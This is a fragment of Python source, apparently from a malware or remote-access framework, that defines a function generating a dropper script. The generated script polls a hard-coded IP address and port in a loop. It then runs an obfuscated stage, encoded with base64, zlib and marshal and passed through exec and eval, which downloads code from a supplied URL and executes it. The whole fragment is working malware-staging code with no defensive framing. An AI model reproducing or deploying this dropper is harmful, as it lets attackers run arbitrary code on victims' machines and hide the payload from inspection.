...
def _dropper(options, **kwargs):
    ...
    dropper = """import sys,zlib,base64,marshal,json,urllib,time
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
while 1:
    try:
        a=urlopen('http://52.14.116.199:1338/')
    except:
        a=0
    if a :
        exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))
    
    time.sleep(5)""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))
